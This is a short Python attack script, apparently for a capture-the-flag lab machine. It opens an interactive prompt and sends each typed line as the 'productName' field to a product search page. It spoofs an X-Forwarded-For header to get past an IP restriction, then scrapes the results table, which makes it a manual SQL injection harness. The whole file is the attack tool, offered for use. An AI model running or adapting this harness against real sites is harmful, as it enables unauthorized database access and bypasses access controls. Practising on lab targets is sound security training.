#!/usr/bin/python3
# coding: utf-8

from pwn import *
import requests
import pdb

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global
main_url = "http://10.10.10.167/search_products.php"
burp = {'http': 'http://127.0.0.1:8080'}

def makeRequest(command):
	
	headers_data = {
		'X-Forwarded-For': '192.168.4.28'
	}

	data_post = {
		'productName': f'{command}'
	}

	r = requests.post(main_url, headers=headers_data, data=data_post)

	# pdb.set_trace()

	regex = re.findall(r'<tbody>\r\n\t\t\t\t\t\t\t(.*?)\t\t\t\t\t\t</tbody>', r.text)[0]

	print(regex)

if __name__ == '__main__':
	
	while True:
		command = input("#> ")
		makeRequest(command.strip())
